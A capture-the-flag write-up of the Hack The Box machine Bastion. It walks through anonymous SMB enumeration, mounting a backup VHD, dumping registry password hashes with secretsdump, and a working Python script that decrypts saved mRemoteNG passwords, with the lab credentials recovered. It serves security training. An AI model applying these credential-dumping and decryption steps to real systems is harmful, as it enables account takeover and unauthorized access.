---
title: HTB: Bastion
url: https://0xdf.gitlab.io/2019/09/07/htb-bastion.html
date: 2019-09-07T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-bastion, hackthebox, ctf, nmap, smbmap, smbclient, smb, vhd, mount, guestmount, secretsdump, crackstation, ssh, windows, mremoteng, oscp-like-v2, oscp-like-v1
---

![Bastion](https://0xdfimages.gitlab.io/img/bastion-cover.png)

Bastion was a solid easy box with some simple challenges like mounting a VHD from a file share, and recovering passwords from a password vault program. It starts, somewhat unusually, without a website, but rather with vhd images on an SMB share, that, once mounted, provide access to the registry hive necessary to pull out credentials. These creds provide the ability to ssh into the host as the user. To get administrator access, I’ll exploit the mRemoteNG installation, pulling the profile data and encrypted data, and show several ways to decrypt those. Once I break out the administrator password, I can ssh in as administrator.

## Box Info

| Name | [Bastion](https://hackthebox.com/machines/bastion)  [Bastion](https://hackthebox.com/machines/bastion) [Play on HackTheBox](https://hackthebox.com/machines/bastion) |
| --- | --- |
| Release Date | [27 Apr 2019](https://twitter.com/hackthebox_eu/status/1121492261542428674) |
| Retire Date | 07 Sep 2019 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Bastion |
| Radar Graph | Radar chart for Bastion |
| First Blood User | 00:26:58[st3r30byt3 st3r30byt3](https://app.hackthebox.com/users/3704) |
| First Blood Root | 01:09:30[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [L4mpje L4mpje](https://app.hackthebox.com/users/29267) |

## Recon

### nmap

`nmap` gives smb (445), Windows rpc / netbios (135/139), and ssh (22):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-03 01:39 EDT
Nmap scan report for 10.10.10.134
Host is up (0.10s latency).
Not shown: 65450 filtered ports, 81 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
root@kali# nmap -sC -sV -p 22,135,139,445 -oA scans/nmap-tcpscripts 10.10.10.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-03 01:40 EDT
Nmap scan report for 10.10.10.134
Host is up (0.097s latency).

PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -45m33s, deviation: 1h09m14s, median: -5m35s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-05-03T07:35:01+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-05-03 01:34:59
|_  start_date: 2019-05-01 23:10:38

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds

```

OpenSSH on Windows is neat.

### SMB

#### Enumeration

`smbmap` doesn’t give me much with a normal run, but will with a bad user name:

```

root@kali# smbmap -H 10.10.10.134
[+] Finding open SMB ports....

root@kali# smbmap -H 10.10.10.134 -u df
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.134...
[+] IP: 10.10.10.134:445	Name: 10.10.10.134                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	Backups                                           	READ, WRITE
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY

```

`smbclient` shows me the `Backups` share as well:

```

root@kali# smbclient -N -L //10.10.10.134

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

```

#### Backups Share

Connecting to `Backups`, I see two files and a directory:

```

root@kali# smbclient -N //10.10.10.134/backups                                                                                                                                                                                               
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 06:02:11 2019
  ..                                  D        0  Tue Apr 16 06:02:11 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

                7735807 blocks of size 4096. 2786156 blocks available

```

The WindowsImageBackup is interesting. First I’ll check out `note.txt`:

```

root@kali# cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.

```

A Windows Image Backup is likely to be large and the transfer will be slow (as the note warns). Rather than try to copy it over, I’m going to mount this share to my filesystem.

```

root@kali# mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
root@kali# ls /mnt/
note.txt  SDT65CB.tmp  WindowsImageBackup

```

I’ll list all the files in the share:

```

root@kali# find /mnt/ -type f
/mnt/note.txt
/mnt/SDT65CB.tmp
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/BackupSpecs.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
/mnt/WindowsImageBackup/L4mpje-PC/Catalog/BackupGlobalCatalog
/mnt/WindowsImageBackup/L4mpje-PC/Catalog/GlobalCatalog
/mnt/WindowsImageBackup/L4mpje-PC/MediaId
/mnt/WindowsImageBackup/L4mpje-PC/SPPMetadataCache/{cd113385-65ff-4ea2-8ced-5630f6feca8f}

```

I see two disk image vhd files.

#### Mount vhd

I’m going to mount the virtual disk files and see what I can find in them. First, I’ll install `guestmount` with `apt install libguestfs-tools`, a [tool for mounting virtual hard disk files](https://linux.die.net/man/1/guestmount) on Linux.

Now, I’ll try to mount each of the two VHD files. The first one fails:

```

root@kali# guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
guestmount: no operating system was found on this disk

If using guestfish ‘-i’ option, remove this option and instead
use the commands ‘run’ followed by ‘list-filesystems’.
You can then mount filesystems you want by hand using the
‘mount’ or ‘mount-ro’ command.

If using guestmount ‘-i’, remove this option and choose the
filesystem(s) you want to see by manually adding ‘-m’ option(s).
Use ‘virt-filesystems’ to see what filesystems are available.

If using other virt tools, this disk image won’t work
with these tools.  Use the guestfish equivalent commands
(see the virt tool manual page).

```

The second one works, providing access to what looks like a Windows file system root:

```

root@kali# guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
root@kali# ls /mnt2/
'$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows

```

## Shell as l4mpje

### Dump Hashes From Registry

With full access to the file system, I have access to the registry files. These files can be locked when the system is running, but I won’t have that issue on a mounted drive. In the `config` directory where the registry hives are stored, I’ll use `secretsdump.py` to dump the password hashes:

```

root@kali:/mnt2/Windows/System32/config# secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:e4487d0421e6611a364a5028467e053c:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 

```

I’ll also notice that `secretsdump.py` identified a default password (or autolongon password) of “bureaulampje” for an unknown user.

### Crack Hash

Submitting the NTLM hashes to [crackstation](https://crackstation.net/) returns the same password for the l4mpje account:

![1557434097548](https://0xdfimages.gitlab.io/img/1557434097548.png)

### SSH

Seeing ssh on a Windows box is a bit unusual, but this seems like a good chance to use it. I can ssh in as l4mpje:

```

root@kali# ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>

```

And now I can grab `user.txt`:

```

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
9bfe57d5...

```

## Privesc to administrator

### Enumeration

In looking at the installed programs on the host, `mRemoteNG` jumps out as interesting:

```

PS C:\Program Files (x86)> dir

    Directory: C:\Program Files (x86)

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        16-7-2016     15:23                Common Files
d-----        23-2-2019     09:38                Internet Explorer
d-----        16-7-2016     15:23                Microsoft.NET
da----        22-2-2019     14:01                mRemoteNG
d-----        23-2-2019     10:22                Windows Defender
d-----        23-2-2019     09:38                Windows Mail
d-----        23-2-2019     10:22                Windows Media Player
d-----        16-7-2016     15:23                Windows Multimedia Platform
d-----        16-7-2016     15:23                Windows NT
d-----        23-2-2019     10:22                Windows Photo Viewer
d-----        16-7-2016     15:23                Windows Portable Devices
d-----        16-7-2016     15:23                WindowsPowerShell

```

[mRemoteNG](https://github.com/mRemoteNG/mRemoteNG) is a remote connection management tool, and it allows the user to save passwords for various types of connections. There is a file in the user’s AppData directory, `confCons.xml`, that holds that information:

```

l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                    
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 0CB3-C487                                                                                              

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                         

22-02-2019  15:03    <DIR>          .                                                                                           
22-02-2019  15:03    <DIR>          ..                                                                                          
22-02-2019  15:03             6.316 confCons.xml                                                                                
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
22-02-2019  15:03                51 extApps.xml                                                                                 
22-02-2019  15:03             5.217 mRemoteNG.log                                                                               
22-02-2019  15:03             2.245 pnlLayout.xml                                                                               
22-02-2019  15:01    <DIR>          Themes                                                                                      
              14 File(s)         76.577 bytes                                                                                   
               3 Dir(s)  11.383.193.600 bytes free  

```

It’s xml, with encrypted versions of the passwords stored in the file:

```

<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="9+/QC0ASX6vyu8eqAnoWf9rAqVvP8vuwonKagk7aY68lTF3pcqbgO0Lcj6E7xUwo6V47gl93CKdDTXKpYt0wOFk6" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>

```

I solved this box right when it was released, and the above file is what it was at that time. It seems that the file has been changed since then. It doesn’t matter, the results are the same. But if you see different values from what I have, that is why. The resulting passwords will be the same.

### Extract Passwords

#### Old Techniques

There’s a lot of articles like [this](http://cosine-security.blogspot.com/2011/06/stealing-password-from-mremote.html) and [this](https://packetstormsecurity.com/files/126309/mRemote-Offline-Password-Decrypt.html) that target an older version of the software that used a static key to decrypt the passwords. The [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/mremote.rb) abuses this as well. Starting in version 1.76, the use can now choose a master password, but there is still a default password or “mR3m”. But, the default AES block mode also changed, which leaves all the older tools still incapabile of decrpyting newer files.

#### Method 1: From Within mRemoteNG

I’ll open my [Commando VM](/2019/04/09/commando-vm-installation.html) and install `mRemoteNG`. Then I’ll drop the `confCons.xml` file from target into `C:\Users\0xdf\AppData\Roaming\mRemoteNG` and re-open `mRemoteNG`. I’ll see two connections listed:

![1557456754788](https://0xdfimages.gitlab.io/img/1557456754788.png)

`mRemoteNG` doesn’t want to just tell me the passwords. However, I can use the fact that the program wants to allow me to connect it to external tools that it may not be pre-programed to work with by creating a new External Tool by going to Tools -> External Tools -> New External Tool.

In the Window that opens, I’ll add a display name, filename, and arguments as follows:

![1557457036252](https://0xdfimages.gitlab.io/img/1557457036252.png)

My external tool is just `cmd`, and I have it running an echo with the username and password.

Now I can right-click on a connection, go to External Tools, and Password is an option:

![1557456800055](https://0xdfimages.gitlab.io/img/1557456800055.png)

Clicking it pops a `cmd` window with the password at the top:

![1557457064938](https://0xdfimages.gitlab.io/img/1557457064938.png)

The password for L4mpje matches what I already know. The password for DC is new:

![1557457101260](https://0xdfimages.gitlab.io/img/1557457101260.png)

Now I have the administrtor password, “thXLHM96BeKL0ER2”.

#### Method 2: mremoteng-decrypt

Around the time Bastion came out, [mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt) showed up on GitHub. At the time, there was only a java release, which I [downloaded](https://github.com/kmahyyg/mremoteng-decrypt/releases) and ran here, and it worked:

```

root@kali:/opt/mremoteng-decrypt# java -jar decipher_mremoteng.jar OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7
User Input: OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7
Use default password for cracking...
Decrypted Output: bureaulampje

root@kali:/opt/mremoteng-decrypt# java -jar decipher_mremoteng.jar V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
User Input: V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
Use default password for cracking...
Decrypted Output: thXLHM96BeKL0ER2

```

I see now that there is a python script as well, though I haven’t played with it.

#### Method 3: Script It

At the time I was solving, there was only a java version on that GitHub, and I wanted a `python` version. So I wrote a quick script:

```

  1 #!/usr/bin/env python3
  2 
  3 import base64
  4 import hashlib
  5 import re
  6 import sys
  7 from Cryptodome.Cipher import AES
  8 
  9 if len(sys.argv) != 2:
 10     print(f"[-] Usage: {sys.argv[0]} [confCons.xml]")
 11     sys.exit()
 12 
 13 try:
 14     with open(sys.argv[1], 'r') as f:
 15         conf = f.read()
 16 except FileNotFoundError:
 17     print(f"[-] Unable to open {sys.argv[1]}")
 18     sys.exit()
 19 
 20 mode = re.findall('BlockCipherMode="(\w+)"', conf)
 21 if len(mode) !=1:
 22     print("[-] Warning - No BlockCipherMode detected")
 23 elif mode[0] != 'GCM':
 24     print(f"[-] Warning - This script is for AES GCM Mode. {mode} detected")
 25 
 26 nodes = re.findall('<Node .+/>', conf)
 27 if len(nodes) > 0:
 28     print(f"[+] Found nodes: {len(nodes)}\n")
 29 else:
 30     print("[-] Found no nodes")
 31 
 32 for node in nodes:
 33     user = re.findall(' Username="(\w*)"', node)[0]
 34     enc = base64.b64decode(re.findall(' Password="([^ ]+)"', node)[0])
 35     salt = enc[:16]
 36     nonce = enc[16:32]
 37     cipher = enc[32:-16]
 38     tag = enc[-16:]
 39     key = hashlib.pbkdf2_hmac("sha1", b"mR3m", salt, 1000, dklen=32)
 40     aes = AES.new(key, AES.MODE_GCM, nonce=nonce)
 41     aes.update(salt)
 42     password = aes.decrypt_and_verify(cipher, tag).decode()
 43     print(f"Username: {user}\nPassword: {password}\n")

```

It takes a `consCons.xml` file, and prints all the decrpyted passwords it can find.

```

root@kali# ./mRemoteNG-decrypt.py confCons.xml-orig 
[+] Found nodes: 2

Username: Administrator
Password: thXLHM96BeKL0ER2

Username: L4mpje
Password: bureaulampje

```

This script is also available [on my Gitlab](https://gitlab.com/0xdf/ctfscripts).

### SSH as administrator

With that password, I can ssh in as administrator:

```

root@kali# ssh administrator@10.10.10.134
administrator@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator>

```

And I can grab `root.txt`:

```

administrator@BASTION C:\Users\Administrator\Desktop>type root.txt
958850b9...

```